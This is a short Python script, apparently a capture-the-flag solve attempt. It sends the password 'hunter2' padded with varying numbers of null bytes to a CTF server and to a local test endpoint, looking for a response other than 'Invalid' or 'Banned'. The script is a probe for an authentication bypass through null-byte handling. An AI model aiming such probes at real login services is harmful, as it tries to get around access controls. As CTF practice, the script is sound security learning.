import requests

URI = 'http://localhost:20000/test/'

pw_string = b'hunter2' + (b'\x00' * 1)
datta = {"password": pw_string}
r = requests.post('http://spooktoberctf.se:22082/', data=datta, timeout=1)


print()






def req(i=0):
    # pw_string = b'\x00' * i + b'hunter2'
    pw_string = b'hunter2' + (b'\x00' * i)
    datta = {"password": pw_string}
    r = requests.post(URI, data=datta, timeout=1)
    if r.status_code != 200:
        print()
    print(f'i: {pw_string} is {r.text}')
    if r.text != "Invalid" and r.text != 'Banned':
        print()


for i in range(10):
    req(i)
    print(i)


print()

